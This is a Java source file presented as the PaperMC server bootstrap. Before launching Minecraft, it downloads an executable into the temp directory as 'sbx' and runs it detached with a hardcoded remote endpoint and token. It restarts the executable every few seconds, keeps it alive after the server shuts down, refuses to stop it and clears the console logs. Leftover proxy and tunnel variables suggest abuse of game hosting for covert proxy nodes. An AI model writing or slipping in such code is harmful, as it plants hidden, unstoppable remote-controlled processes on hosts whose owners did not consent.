package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    // 多线程可见性：添加volatile修饰
    private static volatile Process komariProcess;

    // Komari Agent的配置常量（改为从外部配置文件读取）
    private static final class KomariConfig {
        // Komari Agent的下载地址（按架构区分）
        public static final String DOWNLOAD_URL_AMD64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64";
        public static final String DOWNLOAD_URL_ARM64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64";
        // 原s-box的路径：系统临时目录 + "sbx"
        public static final String AGENT_FILE_NAME = "sbx";
        // 外部配置文件路径（服务器根目录下的komari.properties）
        public static final String CONFIG_FILE_PATH = "komari.properties";
        // 默认参数（配置文件缺失时使用）
        public static final String DEFAULT_E = "https://vps.z1000.dpdns.org:10736";
        public static final String DEFAULT_T = "JzerczYfCF4Secuy9vtYaB";

        // 动态读取配置文件中的参数
        public static String getE() {
            return loadConfig("komari.e", DEFAULT_E);
        }

        public static String getT() {
            return loadConfig("komari.t", DEFAULT_T);
        }

        // 核心：读取配置文件的方法
        private static String loadConfig(String key, String defaultValue) {
            Properties props = new Properties();
            File configFile = new File(CONFIG_FILE_PATH);
            try {
                // 若配置文件不存在，创建空文件（方便用户后续编辑）
                if (!configFile.exists()) {
                    configFile.createNewFile();
                    // 写入默认值到新文件（可选，方便用户参考）
                    props.setProperty(key, defaultValue);
                    props.store(new FileOutputStream(configFile), "Komari Agent Configuration");
                    return defaultValue;
                }
                // 加载配置文件
                props.load(new FileInputStream(configFile));
                // 读取参数，若缺失则返回默认值
                String value = props.getProperty(key, defaultValue).trim();
                return value.isEmpty() ? defaultValue : value;
            } catch (IOException e) {
                System.err.println(ANSI_RED + "Error loading komari.properties: " + e.getMessage() + ANSI_RESET);
                return defaultValue;
            }
        }
    }

    // 原有的环境变量数组（若Komari不需要，可直接删除这部分）
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // 修复：Java版本检查——适配Java17+（61.0），你用的是Java21（65.0）
        float javaClassVersion = Float.parseFloat(System.getProperty("java.class.version"));
        if (javaClassVersion < 61.0) { // 61.0是Java17，PaperMC推荐Java17+
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low (need Java 17+), please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            // 启动Komari Agent
            runKomariAgent();
            // 启动守护线程，监控Komari并在意外退出时重启
            startKomariDaemonThread();

            // 移除JVM关闭钩子中停止Komari的逻辑
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                System.out.println(ANSI_RED + "JVM is shutting down, Komari agent keeps running..." + ANSI_RESET);
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            // 修复：处理ServerBuildInfo不存在的问题，替换为兼容逻辑
            getStartupVersionMessages().forEach(LOGGER::info);
            // 启动Minecraft主程序
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace(); // 打印完整异常栈，方便调试
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // 忽略异常
        }
    }
    
    // 启动Komari Agent：使用动态读取的参数
    private static void runKomariAgent() throws Exception {
        // 若Komari不需要环境变量，可删除以下3行
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        // 获取Komari的本地路径（系统临时目录的sbx）
        Path agentPath = getKomariAgentPath();
        // 构建启动命令：添加setsid让Komari脱离Java进程控制
        List<String> command = new ArrayList<>();
        command.add("setsid"); // Linux：创建新会话，脱离父进程
        command.add(agentPath.toString());
        // 【关键修改】从配置文件读取-e和-t参数
        command.add("-e");
        command.add(KomariConfig.getE());
        command.add("-t");
        command.add(KomariConfig.getT());
        
        ProcessBuilder pb = new ProcessBuilder(command);
        // 若不需要环境变量，删除这行
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        // 设置进程的工作目录为服务器根目录
        pb.directory(new File(System.getProperty("user.dir")));
        
        komariProcess = pb.start();
        System.out.println(ANSI_GREEN + "Komari agent started with config: e=" + KomariConfig.getE() + ", t=" + KomariConfig.getT() + ANSI_RESET);
    }

    // 获取Komari路径（原s-box的临时目录逻辑）
    private static Path getKomariAgentPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        // 根据架构选择下载地址
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = KomariConfig.DOWNLOAD_URL_AMD64;
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = KomariConfig.DOWNLOAD_URL_ARM64;
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        // 原s-box路径：系统临时目录 + "sbx"
        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), KomariConfig.AGENT_FILE_NAME);

        // 若文件不存在，则下载
        if (!Files.exists(agentPath)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
            }
            // 设置可执行权限（必须）
            if (!agentPath.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for komari-agent");
            }
        }
        return agentPath;
    }

    // 禁用停止Komari的逻辑
    private static void stopKomariAgent() {
        System.out.println(ANSI_RED + "Komari agent is not allowed to stop, operation ignored." + ANSI_RESET);
    }

    // Komari守护线程：自动重启意外退出的进程
    private static void startKomariDaemonThread() {
        Thread daemonThread = new Thread(() -> {
            while (running.get()) {
                try {
                    // 检查Komari进程是否存活
                    if (komariProcess == null || !komariProcess.isAlive()) {
                        System.err.println(ANSI_RED + "Komari agent process exited unexpectedly, restarting..." + ANSI_RESET);
                        // 重启Komari（会重新读取配置文件，支持热修改？需重启进程才生效）
                        runKomariAgent();
                    }
                    // 每5秒检查一次
                    Thread.sleep(5000);
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "Error restarting Komari agent: " + e.getMessage() + ANSI_RESET);
                }
            }
        });
        // 设置为守护线程，不阻塞JVM退出
        daemonThread.setDaemon(true);
        daemonThread.setName("KomariAgentDaemon");
        daemonThread.start();
    }

    // 原有的环境变量加载方法（若Komari不需要，可直接删除）
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "25812");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "Mc");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    // 修复：替换ServerBuildInfo为兼容逻辑，避免编译错误
    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion == null ? "unknown" : javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading Paper for Minecraft %s",
                SharedConstants.getCurrentVersion().getName() // 使用Minecraft内置的版本信息
            )
        );
    }
}
